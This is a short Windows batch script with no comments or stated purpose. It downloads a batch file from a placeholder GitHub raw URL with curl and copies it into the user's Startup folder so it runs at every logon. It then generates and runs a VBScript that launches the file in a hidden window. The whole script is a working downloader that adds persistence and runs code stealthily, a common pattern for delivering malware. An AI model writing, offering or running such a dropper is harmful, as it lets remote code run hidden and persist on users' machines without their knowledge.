@echo off

set url=YOUR_GITHUB_RAW_URL
set outputFile=script.bat
set vbsScript=run.vbs
set startupFolder="%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

curl -o %outputFile% %url%
copy %outputFile% %startupFolder%

echo Set objShell = WScript.CreateObject("WScript.Shell") > %vbsScript%
echo objShell.Run "%startupFolder%\%outputFile%", 0, True >> %vbsScript%

cscript /nologo %vbsScript%
